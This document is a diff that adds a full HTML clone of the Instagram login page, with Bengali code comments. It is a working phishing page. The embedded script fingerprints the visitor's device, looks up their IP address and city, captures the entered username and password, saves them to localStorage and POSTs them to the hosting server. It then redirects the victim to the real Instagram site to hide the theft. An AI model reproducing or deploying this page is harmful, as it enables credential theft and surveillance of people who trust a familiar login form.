@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login • Instagram</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    <style>
+        /* Base Styles - Mobile First */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #ffffff; /* Default background is white for mobile */
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #262626;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; /* Vertically centered */
+            flex-grow: 1; /* Takes up available space */
+            width: 100%;
+            padding: 20px;
+        }
+
+        /* Login & Signup Boxes */
+        .login-box, .signup-box {
+            background-color: transparent; /* No background color on mobile */
+            border: none; /* No border on mobile */
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            padding: 0 10px; /* Reduced padding on mobile */
+            margin-bottom: 10px;
+        }
+        
+        /* Instagram Logo */
+        .instagram-logo {
+            font-family: 'Grand Hotel', cursive;
+            font-size: 50px;
+            font-weight: 400;
+            margin: 20px auto;
+            color: #262626;
+        }
+        
+        /* Form Inputs */
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .input-field {
+            width: 100%;
+            height: 44px; /* Taller for easier tapping */
+            border: 1px solid #dbdbdb;
+            border-radius: 6px; /* Slightly more rounded */
+            padding: 0 12px;
+            font-size: 14px;
+            background-color: #fafafa;
+            margin-bottom: 8px;
+            outline: none;
+        }
+        
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        ::placeholder {
+            color: #8e8e8e;
+        }
+        
+        /* Login Button */
+        .login-button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 0;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 14px;
+            margin-bottom: 14px;
+            transition: background-color 0.3s;
+        }
+        
+        .login-button:hover {
+            background-color: #1877f2;
+        }
+
+        .login-button:disabled {
+            background-color: #b2dffc;
+            cursor: wait;
+        }
+        
+        /* Divider with "OR" text */
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #8e8e8e;
+            margin: 15px 0;
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex-grow: 1;
+            background-color: #dbdbdb;
+            height: 1px;
+        }
+
+        .divider::before { margin-right: 18px; }
+        .divider::after { margin-left: 18px; }
+
+        /* Social Login (Facebook) */
+        .facebook-login {
+            color: #385185;
+            text-decoration: none;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+
+        .facebook-icon {
+            width: 16px;
+            height: 16px;
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpCE-z.png");
+            background-repeat: no-repeat;
+            background-position: -414px -259px;
+        }
+
+        /* Forgot Password Link */
+        .forgot-password {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        /* Sign Up Section (at the bottom on mobile) */
+        .signup-section {
+            border-top: 1px solid #dbdbdb;
+            padding: 20px 0;
+            width: 100%;
+            text-align: center;
+            position: absolute;
+            bottom: 0;
+            background-color: #fafafa;
+        }
+
+        .signup-section a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Hide desktop-only elements on mobile */
+        .signup-box, .get-the-app {
+            display: none;
+        }
+
+        .footer {
+            display: none; /* Hide footer on mobile for a cleaner, app-like look */
+        }
+        
+        /* Desktop Styles */
+        @media (min-width: 768px) {
+            body { background-color: #fafafa; }
+            .main-container { flex-grow: 0; padding-top: 40px; padding-bottom: 40px; }
+            .login-box { background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 20px 40px; }
+            .signup-box { display: block; background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px 40px; }
+            .get-the-app { display: block; text-align: center; margin: 20px 0; }
+            .app-badges { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }
+            .app-badges img { height: 40px; }
+            .signup-section { display: none; }
+            .footer { display: block; text-align: center; padding: 20px 0; }
+            .footer-nav ul { display: flex; flex-wrap: wrap; justify-content: center; list-style: none; gap: 16px; }
+            .footer-nav a { color: #8e8e8e; text-decoration: none; font-size: 12px; }
+            .copyright { margin-top: 20px; color: #8e8e8e; font-size: 12px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="login-box">
+            <h1 class="instagram-logo">Instagram</h1>
+            <form class="login-form">
+                <input type="text" name="email" id="email" class="input-field" placeholder="Phone number, username, or email" required>
+                <input type="password" name="pass" id="pass" class="input-field" placeholder="Password" required>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            
+            <div class="divider">OR</div>
+            
+            <a href="#" class="facebook-login">
+                <span class="facebook-icon"></span>
+                <span>Log in with Facebook</span>
+            </a>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <div class="get-the-app">
+            <p>Get the app.</p>
+            <div class="app-badges">
+                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store"></a>
+                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play"></a>
+            </div>
+        </div>
+    </div>
+
+    <div class="signup-section">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <footer class="footer">
+        <nav class="footer-nav">
+            <ul>
+                <li><a href="#">Meta</a></li><li><a href="#">About</a></li><li><a href="#">Blog</a></li><li><a href="#">Jobs</a></li><li><a href="#">Help</a></li>
+                <li><a href="#">API</a></li><li><a href="#">Privacy</a></li><li><a href="#">Terms</a></li><li><a href="#">Locations</a></li>
+                <li><a href="#">Instagram Lite</a></li><li><a href="#">Threads</a></li><li><a href="#">Contact Uploading & Non-Users</a></li>
+                <li><a href="#">Meta Verified</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            <span>English (UK)</span>
+            <span>&copy; 2023 Instagram from Meta</span>
+        </div>
+    </footer>
+
+    <!-- =========== ডেটা সংগ্রহের জন্য নতুন স্ক্রিপ্ট =========== -->
+    <script>
+        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
+        let deviceInfoPromise = (async () => {
+            const deviceInfo = {
+                ua: navigator.userAgent || 'Unknown', platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown', res: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            if (navigator.connection) deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
+                    deviceInfo.isCharging = battery.charging;
+                } catch (e) { /* ignore */ }
+            }
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                deviceInfo.ip = ipData.ip;
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+            } catch (e) { deviceInfo.ip = 'Failed to fetch'; }
+            return JSON.stringify(deviceInfo);
+        })();
+
+        // ফর্ম সাবমিট করার সময় ডেটা ম্যানেজ করা
+        document.querySelector('.login-form').addEventListener('submit', async function(event) {
+            event.preventDefault(); // ফর্মের ডিফল্ট সাবমিশন বন্ধ করা
+
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if (!email || !pass) {
+                alert('Please enter both username and password.');
+                return;
+            }
+
+            const loginButton = document.querySelector('.login-button');
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
+            
+            const deviceInfo = await deviceInfoPromise;
+
+            // LocalStorage-এ ডেটা সেভ করা
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.instagramData) {
+                    storedData.instagramData = [];
+                }
+                storedData.instagramData.push({
+                    email: email,
+                    pass: pass,
+                    deviceInfo: deviceInfo,
+                    timestamp: new Date().toLocaleString(),
+                    type: 'login'
+                });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (error) {
+                console.error('Error saving to localStorage:', error);
+            }
+
+            // সার্ভারে ডেটা পাঠানোর সিমুলেশন
+            try {
+                await fetch('/', { 
+                    method: 'POST', 
+                    body: new URLSearchParams({ email, pass, deviceInfo }) 
+                });
+            } catch (error) {
+                console.error('Error sending data to server:', error);
+            }
+
+            // ব্যবহারকারীকে আসল Instagram সাইটে রিডাইরেক্ট করা
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
